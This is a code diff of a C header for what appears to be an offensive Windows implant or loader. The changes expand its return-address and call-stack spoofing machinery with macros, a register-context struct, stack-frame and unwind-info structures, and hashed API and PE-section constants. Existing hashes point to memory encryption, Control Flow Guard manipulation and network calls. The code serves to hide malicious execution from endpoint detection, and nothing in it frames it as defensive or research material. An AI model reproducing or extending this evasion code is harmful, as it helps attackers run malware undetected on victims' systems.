@@ -11,18 +11,25 @@
 #include <ntstatus.h>
 #include "native.h"
 
-
-#define SPOOF_X( function, module, size )                             SpoofRetAddr( function, module, size, NULL, NULL, NULL, NULL, NULL, NULL, NULL )
-#define SPOOF_A( function, module, size, a )                          SpoofRetAddr( function, module, size, a, NULL, NULL, NULL, NULL, NULL, NULL, NULL )
-#define SPOOF_B( function, module, size, a, b )                       SpoofRetAddr( function, module, size, a, b, NULL, NULL, NULL, NULL, NULL, NULL )
-#define SPOOF_C( function, module, size, a, b, c )                    SpoofRetAddr( function, module, size, a, b, c, NULL, NULL, NULL, NULL, NULL )
-#define SPOOF_D( function, module, size, a, b, c, d )                 SpoofRetAddr( function, module, size, a, b, c, d, NULL, NULL, NULL, NULL )
-#define SPOOF_E( function, module, size, a, b, c, d, e )              SpoofRetAddr( function, module, size, a, b, c, d, e, NULL, NULL, NULL )
-#define SPOOF_F( function, module, size, a, b, c, d, e, f )           SpoofRetAddr( function, module, size, a, b, c, d, e, f, NULL, NULL )
-#define SPOOF_G( function, module, size, a, b, c, d, e, f, g )        SpoofRetAddr( function, module, size, a, b, c, d, e, f, g, NULL )
-#define SPOOF_H( function, module, size, a, b, c, d, e, f, g, h )     SpoofRetAddr( function, module, size, a, b, c, d, e, f, g, h )
-#define SETUP_ARGS(arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12, ...) arg12
-#define SPOOF_MACRO_CHOOSER(...) SETUP_ARGS(__VA_ARGS__, SPOOF_H, SPOOF_G, SPOOF_F, SPOOF_E, SPOOF_D, SPOOF_C, SPOOF_B, SPOOF_A, SPOOF_X, )
+// Spoof stuff
+// SPOOF first 3 args are: Function, Module, Size. Only function is necessary, else a rando gadget from kernel32 is pulled
+// Then just pass the rest of the arguments are you would normally
+#define SPOOF_X( function, module, size )                                            SpoofRetAddr( 0, function, module, size, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL )
+#define SPOOF_A( function, module, size, a )                                         SpoofRetAddr( 0, function, module, size, a, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL )
+#define SPOOF_B( function, module, size, a, b )                                      SpoofRetAddr( 0, function, module, size, a, b, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL )
+#define SPOOF_C( function, module, size, a, b, c )                                   SpoofRetAddr( 0, function, module, size, a, b, c, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL )
+#define SPOOF_D( function, module, size, a, b, c, d )                                SpoofRetAddr( 0, function, module, size, a, b, c, d, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL )
+#define SPOOF_E( function, module, size, a, b, c, d, e )                             SpoofRetAddr( 1, function, module, size, a, b, c, d, e, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL )
+#define SPOOF_F( function, module, size, a, b, c, d, e, f )                          SpoofRetAddr( 2, function, module, size, a, b, c, d, e, f, NULL, NULL, NULL, NULL, NULL, NULL, NULL )
+#define SPOOF_G( function, module, size, a, b, c, d, e, f, g )                       SpoofRetAddr( 3, function, module, size, a, b, c, d, e, f, g, NULL, NULL, NULL, NULL, NULL, NULL )
+#define SPOOF_H( function, module, size, a, b, c, d, e, f, g, h )                    SpoofRetAddr( 4, function, module, size, a, b, c, d, e, f, g, h, NULL, NULL, NULL, NULL, NULL )
+#define SPOOF_I( function, module, size, a, b, c, d, e, f, g, h, i )                 SpoofRetAddr( 5, function, module, size, a, b, c, d, e, f, g, h, i, NULL, NULL, NULL, NULL )
+#define SPOOF_J( function, module, size, a, b, c, d, e, f, g, h, i, j )              SpoofRetAddr( 6, function, module, size, a, b, c, d, e, f, g, h, i, j, NULL, NULL, NULL )
+#define SPOOF_K( function, module, size, a, b, c, d, e, f, g, h, i, j, k )           SpoofRetAddr( 7, function, module, size, a, b, c, d, e, f, g, h, i, j, k, NULL, NULL )
+#define SPOOF_L( function, module, size, a, b, c, d, e, f, g, h, i, j, k, l )        SpoofRetAddr( 8, function, module, size, a, b, c, d, e, f, g, h, i, j, k, l, NULL )
+#define SPOOF_M( function, module, size, a, b, c, d, e, f, g, h, i, j, k, l, m )     SpoofRetAddr( 9, function, module, size, a, b, c, d, e, f, g, h, i, j, k, l, m )
+#define SETUP_ARGS(arg1, arg2, arg3, arg4, arg5, arg6, arg7, arg8, arg9, arg10, arg11, arg12, arg13, arg14, arg15, arg16, arg17, ...) arg17
+#define SPOOF_MACRO_CHOOSER(...) SETUP_ARGS(__VA_ARGS__, SPOOF_M, SPOOF_L, SPOOF_K, SPOOF_J, SPOOF_I, SPOOF_H, SPOOF_G, SPOOF_F, SPOOF_E, SPOOF_D, SPOOF_C, SPOOF_B, SPOOF_A, SPOOF_X)
 #define SPOOF(...) SPOOF_MACRO_CHOOSER(__VA_ARGS__)(__VA_ARGS__)
 
 #define OFFSET( x )    ( ULONG_PTR )( GetIp( ) - ( ( ULONG_PTR ) & GetIp - ( ULONG_PTR ) x ) )
@@ -41,16 +48,81 @@ typedef struct __attribute__(( packed ))
     HANDLE    Heap;
 } STUB, *PSTUB ;
 
-typedef struct {
-    const void* trampoline;     // always JMP RBX
-    void* function;             // Target Function
-    void* rbx;                  // Placeholder
-} PRM, *PPRM;
+// typedef struct {
+//     const void* trampoline;     // always JMP RBX
+//     void* function;             // Target Function
+//     void* rbx;                  // Placeholder
+// } PRM, *PPRM;
+typedef struct
+{
+    PVOID       Fixup;             // 0
+    PVOID       OG_retaddr;        // 8
+    PVOID       rbx;               // 16
+    PVOID       rdi;               // 24
+    PVOID       BTIT_ss;           // 32
+    PVOID       BTIT_retaddr;      // 40
+    PVOID       Gadget_ss;         // 48
+    PVOID       RUTS_ss;           // 56
+    PVOID       RUTS_retaddr;      // 64
+    PVOID       ssn;               // 72  
+    PVOID       trampoline;        // 80
+    PVOID       rsi;               // 88
+    PVOID       r12;               // 96
+    PVOID       r13;               // 104
+    PVOID       r14;               // 112
+    PVOID       r15;               // 120
+} PRM, * PPRM;
+/* God Bless Vulcan Raven*/
+typedef struct
+{
+    LPCWSTR dllPath;
+    ULONG offset;
+    ULONG totalStackSize;
+    BOOL requiresLoadLibrary;
+    BOOL setsFramePointer;
+    PVOID returnAddress;
+    BOOL pushRbp;
+    ULONG countOfCodes;
+    BOOL pushRbpIndex;
+} StackFrame, * PStackFrame;
+
+typedef enum _UNWIND_OP_CODES {
+    UWOP_PUSH_NONVOL = 0, /* info == register number */
+    UWOP_ALLOC_LARGE,     /* no info, alloc size in next 2 slots */
+    UWOP_ALLOC_SMALL,     /* info == size of allocation / 8 - 1 */
+    UWOP_SET_FPREG,       /* no info, FP = RSP + UNWIND_INFO.FPRegOffset*16 */
+    UWOP_SAVE_NONVOL,     /* info == register number, offset in next slot */
+    UWOP_SAVE_NONVOL_FAR, /* info == register number, offset in next 2 slots */
+    UWOP_SAVE_XMM128 = 8, /* info == XMM reg number, offset in next slot */
+    UWOP_SAVE_XMM128_FAR, /* info == XMM reg number, offset in next 2 slots */
+    UWOP_PUSH_MACHFRAME   /* info == 0: no error-code, 1: error-code */
+} UNWIND_CODE_OPS;
+
+typedef union _UNWIND_CODE {
+    struct {
+        BYTE CodeOffset;
+        BYTE UnwindOp : 4;
+        BYTE OpInfo : 4;
+    };
+    USHORT FrameOffset;
+} UNWIND_CODE, * PUNWIND_CODE;
+
+typedef struct _UNWIND_INFO {
+    BYTE Version : 3;
+    BYTE Flags : 5;
+    BYTE SizeOfProlog;
+    BYTE CountOfCodes;
+    BYTE FrameRegister : 4;
+    BYTE FrameOffset : 4;
+    UNWIND_CODE UnwindCode[1];
+} UNWIND_INFO, * PUNWIND_INFO;
+
 
 extern ULONG_PTR Start( VOID );
 extern ULONG_PTR GetIp( VOID );
 extern ULONG_PTR Stub( VOID );
-extern PVOID     Spoof( PVOID, PVOID, PVOID, PVOID, PPRM, PVOID, PVOID, PVOID, PVOID, PVOID );
+extern PVOID     Spoof( PVOID, PVOID, PVOID, PVOID, PPRM, PVOID, QWORD, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID, PVOID );
+extern PVOID     Fixup( VOID );
 
 
 #include "util.h"
@@ -101,6 +173,7 @@ extern PVOID     Spoof( PVOID, PVOID, PVOID, PVOID, PPRM, PVOID, PVOID, PVOID, P
 #define H_API_RTLUSERTHREADSTART                    0x353797c
 #define H_API_RTLRANDOMEX                           0x7f1224f5
 #define H_API_RTLWALKHEAP                           0x182bae64
+#define H_API_SLEEP                                 0xe07cd7e
 
 // advapi32.dll
 #define H_API_SYSTEMFUNCTION032                     0xe58c8805
@@ -110,9 +183,14 @@ extern PVOID     Spoof( PVOID, PVOID, PVOID, PVOID, PPRM, PVOID, PVOID, PVOID, P
 #define H_API_HEAPALLOC                             0xadc4062e
 #define H_API_SLEEP                                 0xe07cd7e
 #define H_API_WAITFORSINGLEOBJECTEX                 0x512e1b97
+#define H_API_BASETHREADINITTHUNK                   0xe2491896
 
 // kernelbase.dll
 #define H_API_SETPROCESSVALIDCALLTARGETS            0x647d9236
 
 // wininet.dll
 #define H_API_INTERNETCONNECTA                      0xc058d7b9
+
+// PE Sections
+#define H_SECTION_TEXT                              0xb6ea858
+#define H_SECTION_PDATA                             0x78fa635d
